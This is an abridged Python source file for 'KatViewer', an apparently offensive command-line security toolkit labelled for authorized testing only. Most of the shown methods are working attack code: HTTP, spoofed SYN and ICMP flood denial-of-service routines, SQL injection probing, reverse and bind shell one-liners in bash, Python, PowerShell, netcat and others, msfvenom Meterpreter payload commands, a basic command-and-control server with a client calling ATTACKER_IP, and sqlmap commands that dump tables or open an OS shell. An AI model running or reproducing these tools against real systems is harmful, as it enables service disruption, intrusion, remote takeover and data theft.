...
class KatViewer(cmd.Cmd):  
    ...
    def _print_banner(self):  
        ...
        print(f"\n{Colors.BORDER}**╔═══**{'**═**'*58}**═══╗**")  
        print(f"**║**{title_line}")  
        print(f"**║**{Colors.CYAN}  **██║** **██╔╝██╔══██╗╚══██╔══╝██║**   **██║██║██╔════╝██║**   **██║██╔════╝██╔══██╗** {Colors.BORDER}**║**")  
        print(f"**║**{Colors.CYAN}  **█████╔╝** **███████║**   **██║**   **██║**   **██║██║█████╗**  **██║** **█╗** **██║█████╗**  **██████╔╝** {Colors.BORDER}**║**")  
        print(f"**║**{Colors.CYAN}  **██╔═██╗** **██╔══██║**   **██║**   **╚██╗** **██╔╝██║██╔══╝**  **██║███╗██║██╔══╝**  **██╔══██╗** {Colors.BORDER}**║**")  
        print(f"**║**{Colors.CYAN}  **██║**  **██╗██║**  **██║**   **██║**    **╚████╔╝** **██║███████╗╚███╔███╔╝███████╗██║**  **██║** {Colors.BORDER}**║**")  
        print(f"**║**{Colors.CYAN}  **╚═╝**  **╚═╝╚═╝**  **╚═╝**   **╚═╝**     **╚═══╝**  **╚═╝╚══════╝** **╚══╝╚══╝** **╚══════╝╚═╝**  **╚═╝** {Colors.BORDER}**║**")  
        print(f"**║**{Colors.WHITE}  **╔══════════════════════════════════════════════════════════════════════╗**{Colors.BORDER}  **║**")  
        print(f"**║**{Colors.WHITE}  **║**   SECURITY FRAMEWORK -- 250+ COMMANDS -- AUTHORIZED TESTING ONLY    **║**{Colors.BORDER}  **║**")  
        print(f"**║**{Colors.WHITE}  **╚══════════════════════════════════════════════════════════════════════╝**{Colors.BORDER}  **║**")  
    ...
    def do_service_scan(self, arg):  
        ...
        with ThreadPoolExecutor(max_workers=self.threads) as executor:  
            for p, s in services.items():  
                executor.submit(grab_banner, p, s)  
    ...
    def do_sql_inject(self, arg):  
        ...
        for param in params:  
            for payload in payloads:  
                try:  
                    test_url = target + '?' + param + '=' + urllib.parse.quote(payload)  
    ...
    def do_geoip(self, arg):  
        ...
        try:  
            resp = requests.get('http://ip-api.com/json/' + target, timeout=10)  
            data = resp.json()  
    ...
    def do_dos_http(self, arg):  
        ...
        start = time.time()  
        counters = {'sent': 0, 'errs': 0}  
        def flood():  
            while time.time() - start < duration:  
                try:  
                    h = {'User-Agent': random.choice(self.user_agents), 'X-Forwarded-For': str(random.randint(1,255)) + '.' + str(random.randint(1,255)) + '.' + str(random.randint(1,255)) + '.' + str(random.randint(1,255))}  
        ...
        for t in threads:  
            t.join()  
        print(f"{Colors.GREEN}[+] Sent: {counters['sent']} | Errors: {counters['errs']} | Rate: {counters['sent']/duration:.0f} req/s{Colors.RESET}")  
    ...
    def do_dos_syn(self, arg):  
        ...
        def flood():  
            while time.time() - start < duration:  
                try:  
                    ...
                    ip = scapy.IP(src=src_ip, dst=target)  
        ...
        for t in threads:  
            t.join()  
        print(f"{Colors.GREEN}[+] Packets: {counters['sent']} | Rate: {counters['sent']/duration:.0f} pps{Colors.RESET}")  
    ...
    def do_dos_icmp(self, arg):  
        ...
        for t in threads:  
            t.join()  
        print(f"{Colors.GREEN}[+] Packets: {counters['sent']}{Colors.RESET}")  
    ...
    def do_reverse_shell(self, arg):  
        ...
        shells = {}  
        shells['bash'] = '/bin/bash -i >& /dev/tcp/' + lhost + '/' + lport + ' 0>&1'  
        shells['python'] = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + lhost + "\"," + lport + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"  
        shells['php'] = "php -r '$sock=fsockopen(\"" + lhost + "\"," + lport + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"  
        shells['perl'] = "perl -e 'use Socket;$i=\"" + lhost + "\";$p=" + lport + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'"  
        shells['nc'] = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + lhost + ' ' + lport + ' >/tmp/f'  
        shells['powershell'] = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client=New-Object System.Net.Sockets.TCPClient('" + lhost + "'," + lport + ");$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+$pwd+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""  
        shells['ruby'] = "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"" + lhost + "\"," + lport + "))'"  
        shells['node'] = 'node -e "require(\'net\').connect(' + lport + ',\'' + lhost + '\',function(){require(\'child_process\').exec(\'/bin/sh -i\',function(e,o){this.end(o)})})"'  
        if stype == 'all':  
    ...
    def do_bind_shell(self, arg):  
        ...
        binds = {}  
        binds['bash'] = 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l -p ' + port + ' > /tmp/f'  
        binds['nc'] = 'nc -lvnp ' + port + ' -e /bin/bash'  
        binds['python'] = "python3 -c 'import socket,subprocess,os;s=s.socket(s.AF_INET,s.SOCK_STREAM);s.bind((\"0.0.0.0\"," + port + "));s.listen(1);c,addr=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"/bin/bash\")'"  
        binds['powershell'] = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$listener=New-Object System.Net.Sockets.TcpListener('0.0.0.0'," + port + ");$listener.Start();$client=$listener.AcceptTcpClient();$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=iex $data 2>&1|Out-String;$sendback2=$sendback+'PS '+$pwd+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\""  
    ...
    def do_msf_payload(self, arg):  
        ...
        payloads = [  
            ...
            'msfvenom -p windows/meterpreter/reverse_https LHOST=' + lhost + ' LPORT=' + lport + ' -f exe -o shell.exe',  
            'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=' + lhost + ' LPORT=' + lport + ' -f elf -o shell.elf',  
            'msfvenom -p android/meterpreter/reverse_tcp LHOST=' + lhost + ' LPORT=' + lport + ' -o shell.apk',  
            'msfvenom -p php/meterpreter_reverse_tcp LHOST=' + lhost + ' LPORT=' + lport + ' -f raw -o shell.php',  
            'msfvenom -p python/meterpreter/reverse_tcp LHOST=' + lhost + ' LPORT=' + lport + ' -o shell.py',  
            'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=' + lhost + ' LPORT=' + lport + ' -f psh -o shell.ps1',  
            'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=' + lhost + ' LPORT=' + lport + ' -f macho -o shell.macho',  
        ]  
        for cmd in payloads:  
    ...
    def do_gen_wordlist(self, arg):  
        ...
        output = self.output_dir + '/wordlist_' + base + '.txt'  
    ...
    def do_ssh_keygen(self, arg):  
        ...
        try:  
            ...
            priv_file = self.output_dir + '/katviewer_rsa'  
            pub_file = self.output_dir + '/katviewer_rsa.pub'  
    ...
    def do_shell_encode(self, arg):  
        ...
        msf_parts = []  
        for b in code:  
            msf_parts.append('\\x' + format(b, '02x'))  
        print(f"{Colors.GREEN}[+] MSF Format: {''.join(msf_parts)}{Colors.RESET}")  
    ...
    def do_s3_enum(self, arg):  
        ...
        for suffix in suffixes:  
            url = 'https://' + target + suffix + '.s3.amazonaws.com'  
            try:  
...
resp = requests.head(url, timeout=5)  
    ...
    def do_git_dump(self, arg):  
        ...
        for ep in endpoints:  
            try:  
                resp = requests.get(target.rstrip('/') + ep, timeout=5, verify=False)  
    ...
    def do_backup_scan(self, arg):  
        ...
        for bf in files:  
            try:  
                resp = requests.get(target.rstrip('/') + '/' + bf, timeout=5, verify=False, allow_redirects=False)  
    ...
    def do_cve_search(self, arg):  
        ...
        try:  
            resp = requests.get('https://cve.circl.lu/api/cve/' + arg, timeout=10)  
            data = resp.json()  
    ...
    def do_wpscan(self, arg):  
        ...
        cmds = ['wpscan --url ' + target + ' --enumerate vp --plugins-detection mixed','wpscan --url ' + target + ' --enumerate u','wpscan --url ' + target + ' --passwords /usr/share/wordlists/rockyou.txt --usernames admin']  
        for cmd in cmds:  
            print(f"{Colors.GREEN}[+] {cmd}{Colors.RESET}")  
    ...
    def do_gobuster_scan(self, arg):  
        ...
        cmds = ['gobuster dir -u ' + target + ' -w /usr/share/wordlists/dirb/common.txt -t ' + str(self.threads),'gobuster dns -d ' + target + ' -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt -t ' + str(self.threads)]  
        for cmd in cmds:  
            print(f"{Colors.GREEN}[+] {cmd}{Colors.RESET}")  
    ...
    def do_sqlmap_basic(self, arg):  
        ...
        cmds = ['sqlmap -u "' + target + '" --batch --random-agent','sqlmap -u "' + target + '" --batch --dbs','sqlmap -u "' + target + '" --batch -D database --tables','sqlmap -u "' + target + '" --batch -D database -T users --dump','sqlmap -u "' + target + '" --batch --os-shell']  
        for cmd in cmds:  
            print(f"{Colors.GREEN}[+] {cmd}{Colors.RESET}")  
    ...
    def do_c2_basic(self, arg):  
        ...
        print("import socket,threading")  
        print("def handle(conn,addr):")  
        print("    while True:")  
        print("        cmd=input(\"C2> \")")  
        print("        if cmd=='exit':break")  
        print("        conn.send(cmd.encode())")  
        print("        print(conn.recv(4096).decode())")  
        print("    conn.close()")  
        print("s=socket.socket();s.bind((\"0.0.0.0\"," + port + "));s.listen(5)")  
        print("while True:")  
        print("    conn,addr=s.accept()")  
        print("    threading.Thread(target=handle,args=(conn,addr)).start()")  
        print()  
        print(f"{Colors.GREEN}[+] Client code:{Colors.RESET}")  
        print("import socket,subprocess,os")  
        print("s=socket.socket();s.connect((\"ATTACKER_IP\"," + port + "))")  
        print("while True:")  
        print("    cmd=s.recv(4096).decode()")  
        print("    if cmd=='exit':break")  
        print("    if cmd.startswith('cd '):os.chdir(cmd[3:]);s.send(b'OK')")  
        print("    else:")  
        print("        r=subprocess.run(cmd,shell=True,capture_output=True,text=True)")  
        print("        s.send((r.stdout+r.stderr).encode() if r.stdout+r.stderr else b'Done')")  
        print("s.close()")  
        print()  
    ...
    def do_html_report(self, arg):  
        ...
        now = datetime.now()  
        html = '<!DOCTYPE html><html><head><title>KatViewer Report</title><style>body{font-family:Arial;margin:20px;background:#0a0a2e;color:#00ffff}h1{color:#00aaff;border-bottom:2px solid #0044ff}.box{border:1px solid #0044ff;padding:15px;margin:10px 0;background:#000033}</style></head><body><h1>KatViewer Security Report</h1><div class="box"><p><strong>Target:</strong> ' + (self.target or 'N/A') + '</p><p><strong>Date:</strong> ' + now.strftime('%Y-%m-%d %H:%M:%S') + '</p><p><strong>Status:</strong> Assessment Complete</p></div><div class="box"><p>Testing performed by authorized security professionals only.</p></div></body></html>'  
        path = self.output_dir + '/report_' + now.strftime('%Y%m%d_%H%M%S') + '.html'  
    ...
    def do_help(self, arg):  
        if arg:  
            cmd_name = arg.strip()  
            handler = getattr(self, 'do_' + cmd_name, None)  
            if handler:  
                doc = handler.__doc__  
                if doc:  
